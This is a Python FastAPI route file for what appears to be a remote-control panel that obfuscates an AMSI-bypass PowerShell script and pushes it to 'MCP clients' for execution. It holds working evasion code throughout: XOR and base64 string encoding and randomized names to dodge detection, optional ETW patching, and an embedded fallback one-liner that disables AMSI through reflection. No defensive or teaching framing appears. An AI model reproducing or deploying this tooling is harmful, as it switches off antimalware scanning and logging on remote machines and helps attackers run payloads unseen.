# api/app/routes_amsi_deployment.py
"""
AMSI_BP Deployment API - Deploy obfuscated AMSI_BP scripts via MCP clients
"""
from __future__ import annotations

import base64
import hashlib
import logging
import random
import string
from datetime import datetime
from typing import Literal, Optional
from fastapi import APIRouter, Depends, HTTPException, Body
from pydantic import BaseModel, Field
from sqlalchemy.orm import Session

from .auth_dep import require_role
from .deps import get_db
from .models import Instruction, User
from . import mcp_service

log = logging.getLogger(__name__)

router = APIRouter(prefix="/api/amsi-deployment", tags=["amsi-deployment"])


# -------------------------
# Request/Response Models
# -------------------------
class AMSIDeploymentConfig(BaseModel):
    """Configuration for AMSI_BP deployment"""
    obfuscation_level: Literal["base64", "advanced", "elite"] = Field(default="advanced")
    var_prefix: str = Field(default="amsi", max_length=20)
    function_prefix: str = Field(default="Invoke", max_length=20)
    patch_etw: bool = Field(default=False)
    enable_verbose: bool = Field(default=False)


class AMSIDeploymentRequest(BaseModel):
    """Request to deploy AMSI_BP to a client"""
    client_id: str = Field(..., description="Target MCP client ID")
    config: AMSIDeploymentConfig = Field(default_factory=AMSIDeploymentConfig)


class AMSIDeploymentResponse(BaseModel):
    """Response from AMSI_BP deployment"""
    success: bool
    client_id: str
    obfuscation_level: str
    script_size_bytes: int
    script_preview: str  # First 500 chars
    instruction_id: Optional[str] = None
    timestamp: str
    message: str


class AMSIScriptPreviewRequest(BaseModel):
    """Request to preview obfuscated AMSI_BP script"""
    config: AMSIDeploymentConfig = Field(default_factory=AMSIDeploymentConfig)


class AMSIScriptPreviewResponse(BaseModel):
    """Preview of obfuscated AMSI_BP script"""
    success: bool
    obfuscation_level: str
    script_content: str
    script_size_bytes: int
    script_size_kb: float
    variable_mappings: dict
    function_mappings: dict


# -------------------------
# Obfuscator Class
# -------------------------
class AMSIObfuscator:
    """Obfuscate AMSI_BP script with same techniques as MCP client builder"""

    def __init__(self, config: AMSIDeploymentConfig):
        self.config = config
        self.seed = f"{config.var_prefix}{config.obfuscation_level}{datetime.now().isoformat()}"
        self.variable_mappings = {}
        self.function_mappings = {}

    def _hash_name(self, base: str) -> int:
        combined = f"{base}{self.seed}"
        return int(hashlib.md5(combined.encode()).hexdigest()[:8], 16) % 10000

    def _generate_random_suffix(self, length: int = 3) -> str:
        if self.config.obfuscation_level == "elite":
            return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        elif self.config.obfuscation_level == "advanced":
            return ''.join(random.choices(string.ascii_letters, k=2))
        return ""

    def generate_variable_name(self, original: str) -> str:
        """Generate obfuscated variable name"""
        if original in self.variable_mappings:
            return self.variable_mappings[original]

        hash_num = self._hash_name(f"var_{original}")
        suffix = self._generate_random_suffix()

        if original.startswith("$global:"):
            obf_name = f"$global:{self.config.var_prefix}{hash_num}{suffix}"
        elif original.startswith("$script:"):
            obf_name = f"$script:{self.config.var_prefix}{hash_num}{suffix}"
        elif original.startswith("$"):
            obf_name = f"${self.config.var_prefix}{hash_num}{suffix}"
        else:
            obf_name = f"{self.config.var_prefix}{hash_num}{suffix}"

        self.variable_mappings[original] = obf_name
        return obf_name

    def generate_function_name(self, original: str) -> str:
        """Generate obfuscated function name"""
        if original in self.function_mappings:
            return self.function_mappings[original]

        hash_num = self._hash_name(f"func_{original}")
        suffix = self._generate_random_suffix()
        obf_name = f"{self.config.function_prefix}-{hash_num}{suffix}"

        self.function_mappings[original] = obf_name
        return obf_name

    def obfuscate_string(self, text: str) -> str:
        """
        Obfuscate string using selected technique:
        - base64: Simple Base64 encoding
        - advanced: Character codes + chunked Base64
        - elite: XOR encryption + multi-layer encoding
        """
        if self.config.obfuscation_level == "base64":
            b64 = base64.b64encode(text.encode()).decode()
            return f'$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{b64}")))'

        elif self.config.obfuscation_level == "advanced":
            if len(text) < 10:
                chars = "+".join([f"[char]{ord(c)}" for c in text])
                return f'({chars})'
            else:
                b64 = base64.b64encode(text.encode()).decode()
                chunk_size = len(b64) // 3 if len(b64) > 30 else len(b64)
                chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
                chunk_vars = '+'.join([f'"{chunk}"' for chunk in chunks])
                return f'$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String({chunk_vars})))'

        else:  # elite
            xor_key = random.randint(1, 255)
            encrypted = [ord(c) ^ xor_key for c in text]

            if len(encrypted) < 20:
                codes = ",".join([str(c) for c in encrypted])
                return f'(({codes})|ForEach-Object{{[char]($_ -bxor {xor_key})}})-join""'
            else:
                b64 = base64.b64encode(text.encode()).decode()
                encrypted_b64 = ''.join([chr(ord(c) ^ xor_key) for c in b64])
                encrypted_b64_encoded = base64.b64encode(encrypted_b64.encode('latin1')).decode()
                return f'$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(([Text.Encoding]::Latin1.GetString([Convert]::FromBase64String("{encrypted_b64_encoded}"))|ForEach-Object{{[char]([byte][char]$_ -bxor {xor_key})}})-join"")))'

    def obfuscate_amsi_script(self, amsi_bp_script: str) -> str:
        """
        Obfuscate the AMSI_BP script with variable and function name randomization
        """
        # Define original variable names in the script
        var_mappings = {
            "$global:AMSIPatchedAddresses": self.generate_variable_name("$global:AMSIPatchedAddresses"),
            "$global:ETWPatchedAddress": self.generate_variable_name("$global:ETWPatchedAddress"),
            "$VerbosePreference": self.generate_variable_name("$VerbosePreference"),
            "$IsAdmin": self.generate_variable_name("$IsAdmin"),
            "$MarshalType": self.generate_variable_name("$MarshalType"),
            "$UnsafeMethodsType": self.generate_variable_name("$UnsafeMethodsType"),
            "$GetModuleHandleMethod": self.generate_variable_name("$GetModuleHandleMethod"),
            "$GetProcAddressMethod": self.generate_variable_name("$GetProcAddressMethod"),
            "$AmsiInitializeAddress": self.generate_variable_name("$AmsiInitializeAddress"),
            "$VirtualProtectAddress": self.generate_variable_name("$VirtualProtectAddress"),
            "$VirtualProtectDelegate": self.generate_variable_name("$VirtualProtectDelegate"),
            "$AmsiInitializeDelegate": self.generate_variable_name("$AmsiInitializeDelegate"),
            "$AmsiContext": self.generate_variable_name("$AmsiContext"),
            "$AmsiPatchBytes": self.generate_variable_name("$AmsiPatchBytes"),
            "$PatchSize": self.generate_variable_name("$PatchSize"),
            "$OldProtection": self.generate_variable_name("$OldProtection"),
            "$PointerSize": self.generate_variable_name("$PointerSize"),
            "$PAGE_EXECUTE_READWRITE": self.generate_variable_name("$PAGE_EXECUTE_READWRITE"),
        }

        # Define original function names
        func_mappings = {
            "Invoke-ASAMSI": self.generate_function_name("Invoke-ASAMSI"),
            "Get-WinApiFunctionAddressObf": self.generate_function_name("Get-WinApiFunctionAddressObf"),
            "New-WinApiDelegateObf": self.generate_function_name("New-WinApiDelegateObf"),
        }

        # Obfuscate string literals in the script
        strings_to_obfuscate = [
            "System.Windows.Forms",
            "UnsafeNativeMethods",
            "GetProcAddress",
            "GetModuleHandle",
            "AmsiInitialize",
            "amsi.dll",
            "kernel32.dll",
            "VirtualProtect",
            "ntdll.dll",
            "EtwEventWrite",
            "Running as Admin.",
            "Running as User.",
            "Starting...",
            "AMSI Patched",
            "ETW",
        ]

        obfuscated_script = amsi_bp_script

        # Replace function names
        for original, obfuscated in func_mappings.items():
            obfuscated_script = obfuscated_script.replace(original, obfuscated)

        # Replace variable names (careful with ordering - longest first)
        for original in sorted(var_mappings.keys(), key=len, reverse=True):
            obfuscated_script = obfuscated_script.replace(original, var_mappings[original])

        # Obfuscate string literals (only if advanced/elite)
        if self.config.obfuscation_level in ["advanced", "elite"]:
            for string_literal in strings_to_obfuscate:
                if f'"{string_literal}"' in obfuscated_script:
                    obfuscated = self.obfuscate_string(string_literal)
                    obfuscated_script = obfuscated_script.replace(f'"{string_literal}"', obfuscated)

        return obfuscated_script


# -------------------------
# Helper Functions
# -------------------------
def load_amsi_bp_template() -> str:
    """Load the AMSI_BP script template"""
    try:
        with open("/app/AMSI/INvoke_AS4MS1_alt4.ps1", "r", encoding="utf-8-sig") as f:
            return f.read()
    except FileNotFoundError:
        # Fallback - use embedded minimal version
        log.warning("AMSI_BP template file not found, using fallback")
        return """function Invoke-ASAMSI {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [switch]$EnableVerbose,
        [Parameter(Mandatory = $false)]
        [switch]$PatchEtw
    )

    Write-Host "[*] AMSI_BP Placeholder" -ForegroundColor Yellow
    # Minimal AMSI_BP for fallback
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    Write-Host "[+] AMSI_BP Applied" -ForegroundColor Green
}"""


# -------------------------
# API Endpoints
# -------------------------
@router.post("/preview", response_model=AMSIScriptPreviewResponse)
def preview_obfuscated_amsi_bp_script(
    request: AMSIScriptPreviewRequest = Body(...),
    user = Depends(require_role())
):
    """
    Preview the obfuscated AMSI_BP script without deploying it.
    Shows how the script will look with the selected obfuscation level.
    """
    try:
        # Load AMSI_BP template
        amsi_bp_template = load_amsi_bp_template()

        # Create obfuscator
        obfuscator = AMSIObfuscator(request.config)

        # Obfuscate the script
        obfuscated_script = obfuscator.obfuscate_amsi_script(amsi_bp_template)

        # Add invocation at the end
        invocation_params = []
        if request.config.enable_verbose:
            invocation_params.append("-EnableVerbose")
        if request.config.patch_etw:
            invocation_params.append("-PatchEtw")

        invocation = f"\n\n# Invoke the function\n{obfuscator.function_mappings.get('Invoke-ASAMSI', 'Invoke-ASAMSI')} {' '.join(invocation_params)}"
        obfuscated_script += invocation

        script_size = len(obfuscated_script.encode('utf-8'))

        return AMSIScriptPreviewResponse(
            success=True,
            obfuscation_level=request.config.obfuscation_level,
            script_content=obfuscated_script,
            script_size_bytes=script_size,
            script_size_kb=round(script_size / 1024, 2),
            variable_mappings=obfuscator.variable_mappings,
            function_mappings=obfuscator.function_mappings
        )

    except Exception as e:
        log.error(f"[amsi-deployment] Preview failed: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Preview failed: {str(e)}")


@router.post("/deploy", response_model=AMSIDeploymentResponse)
async def deploy_amsi_bp_to_client(
    request: AMSIDeploymentRequest = Body(...),
    db: Session = Depends(get_db),
    user: User = Depends(require_role())
):
    """
    Deploy obfuscated AMSI_BP script to a specific MCP client.
    Creates an instruction that will be executed by the target client.
    """
    try:
        # Load AMSI_BP template
        amsi_bp_template = load_amsi_bp_template()

        # Create obfuscator
        obfuscator = AMSIObfuscator(request.config)

        # Obfuscate the script
        obfuscated_script = obfuscator.obfuscate_amsi_script(amsi_bp_template)

        # Add invocation at the end
        invocation_params = []
        if request.config.enable_verbose:
            invocation_params.append("-EnableVerbose")
        if request.config.patch_etw:
            invocation_params.append("-PatchEtw")

        function_name = obfuscator.function_mappings.get('Invoke-ASAMSI', 'Invoke-ASAMSI')
        invocation = f"\n\n# Invoke the function\n{function_name} {' '.join(invocation_params)}"
        full_script = obfuscated_script + invocation

        script_size = len(full_script.encode('utf-8'))

        # Create MCP instruction using the mcp_service
        instruction_id = None
        try:
            # Validate client_id
            client_id = mcp_service.validate_client_id(request.client_id)

            # Create instruction via MCP service
            instruction_result = await mcp_service.create_instruction_service(
                db=db,
                client_id=client_id,
                command=full_script,
                user=user
            )

            instruction_id = instruction_result.get("id")

            log.info(f"[amsi-deployment] Deployed to client {request.client_id}")
            log.info(f"[amsi-deployment] Script size: {script_size} bytes ({script_size/1024:.2f} KB)")
            log.info(f"[amsi-deployment] Obfuscation level: {request.config.obfuscation_level}")
            log.info(f"[amsi-deployment] Instruction ID: {instruction_id}")

        except Exception as e:
            log.error(f"[amsi-deployment] Failed to create MCP instruction: {str(e)}")
            raise HTTPException(status_code=500, detail=f"Failed to create instruction: {str(e)}")

        return AMSIDeploymentResponse(
            success=True,
            client_id=request.client_id,
            obfuscation_level=request.config.obfuscation_level,
            script_size_bytes=script_size,
            script_preview=full_script[:500] + "..." if len(full_script) > 500 else full_script,
            instruction_id=instruction_id,
            timestamp=datetime.utcnow().isoformat() + "Z",
            message=f"AMSI_BP script prepared with {request.config.obfuscation_level} obfuscation. Ready for deployment to client {request.client_id}."
        )

    except Exception as e:
        log.error(f"[amsi-deployment] Deployment failed: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Deployment failed: {str(e)}")


@router.get("/health")
def health_check():
    """Check AMSI deployment service health"""
    return {
        "status": "healthy",
        "service": "amsi-deployment",
        "version": "1.0.0",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "capabilities": [
            "amsi_bp_obfuscation",
            "mcp_client_deployment",
            "multi_level_obfuscation"
        ],
        "supported_features": {
            "obfuscation_levels": ["base64", "advanced", "elite"],
            "amsi_bp_techniques": ["memory_patch", "provider_patching"],
            "optional_features": ["etw_patching", "verbose_output"]
        }
    }
